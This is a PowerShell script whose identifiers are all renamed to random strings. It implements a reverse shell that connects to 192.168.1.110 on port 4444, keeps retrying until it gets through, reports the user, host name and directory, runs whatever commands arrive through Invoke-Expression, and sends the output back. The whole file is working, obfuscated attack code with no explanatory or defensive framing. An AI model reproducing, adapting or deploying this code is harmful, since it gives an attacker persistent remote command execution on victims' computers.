class FEjQxCDHoOEuIyeEj {
    
    [string]$WYcEcdjGurCe = "192.168.1.110"
    [int]$DYtRXYemeKblmhWpClYZa = 4444

    $KfUrzMYpKxACnlOQq
    $ZXdylXQhwzJ
    $vKIwJXFwcZCkUpdHHVuu
    $XdGHWuixYKXFtl
    $GwjTBbZwAmHgZBhKPou
    $TPlgBwJsnL
    [int]$pNQTVGFEehMJ = 50*1024

    URosNKIzRYbZ() {
        $this.ZXdylXQhwzJ = $false
        while ($true) {
            try {
                $this.ZXdylXQhwzJ = New-Object Net.Sockets.TcpClient($this.WYcEcdjGurCe, $this.DYtRXYemeKblmhWpClYZa)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.CPypZzFjcmwRJJSdwmzu()
    }

    CPypZzFjcmwRJJSdwmzu() {
        $this.KfUrzMYpKxACnlOQq = $this.ZXdylXQhwzJ.GetStream()
        $this.XdGHWuixYKXFtl = New-Object Byte[] $this.pNQTVGFEehMJ
        $this.TPlgBwJsnL = New-Object Text.UTF8Encoding
        $this.vKIwJXFwcZCkUpdHHVuu = New-Object IO.StreamWriter($this.KfUrzMYpKxACnlOQq, [Text.Encoding]::UTF8, $this.pNQTVGFEehMJ)
        $this.GwjTBbZwAmHgZBhKPou = New-Object System.IO.StreamReader($this.KfUrzMYpKxACnlOQq)
        $this.vKIwJXFwcZCkUpdHHVuu.AutoFlush = $true
    }

    FjEoygW() {
        $this.URosNKIzRYbZ()
        $this.hCZaj()
    }

    Xiwkw($fVxKlG) {
        try {
            [byte[]]$DgrjvRiYKLeNWIUhOKQ = [text.Encoding]::Ascii.GetBytes($fVxKlG)
            $this.vKIwJXFwcZCkUpdHHVuu.Write($DgrjvRiYKLeNWIUhOKQ, 0, $DgrjvRiYKLeNWIUhOKQ.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.FjEoygW()
        }
    }

    [string] eqZEcMNuXGztlnh() {
        try {
            $bJzSvzzjpHQ = $this.KfUrzMYpKxACnlOQq.Read($this.XdGHWuixYKXFtl, 0, $this.pNQTVGFEehMJ)    
            $lXfAMiAKGuqJqlcNJt = ($this.TPlgBwJsnL.GetString($this.XdGHWuixYKXFtl, 0, $bJzSvzzjpHQ))
            return $lXfAMiAKGuqJqlcNJt
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.FjEoygW()
            return ""
        }
    }

    [string] jKiFUUMggMrdPwfsDryWjval($PQPlJvUv) {
        Write-Host $PQPlJvUv
        try { 
            $zqrPwQhsYhdTEsVyRklvD = Invoke-Expression $PQPlJvUv | Out-String
        }
        catch {
            $qtUKuoOIRHZiDFwr = $_.Exception
            $IHKqKExxfeyHchKY = $_.Message
            $zqrPwQhsYhdTEsVyRklvD = "`n$_`n"
        }
        return $zqrPwQhsYhdTEsVyRklvD
    }

    [string] WfIqVovn() {
        $oWPgMQ = [Environment]::UserName
        $pcviLfSjRVp = [System.Net.Dns]::GetHostName()
        $BZLecKgAZcWldsHz = Get-Location
        return "$oWPgMQ@$pcviLfSjRVp [$BZLecKgAZcWldsHz]~$ "
    }

    hCZaj() {
        while ($this.ZXdylXQhwzJ.Connected) {
            $this.Xiwkw($this.WfIqVovn())         
            $lXfAMiAKGuqJqlcNJt = $this.eqZEcMNuXGztlnh()
            $zqrPwQhsYhdTEsVyRklvD = "`n"
            if ([string]::IsNullOrEmpty($lXfAMiAKGuqJqlcNJt)) {
                continue
            }
            $zqrPwQhsYhdTEsVyRklvD = $this.jKiFUUMggMrdPwfsDryWjval($lXfAMiAKGuqJqlcNJt)
            $this.Xiwkw($zqrPwQhsYhdTEsVyRklvD + "`n")
            $this.KfUrzMYpKxACnlOQq.Flush()
        }
        $this.ZXdylXQhwzJ.Close()
        $this.FjEoygW()
    } 
}

$pVAcVsCmk = [FEjQxCDHoOEuIyeEj]::new()
$pVAcVsCmk.FjEoygW()
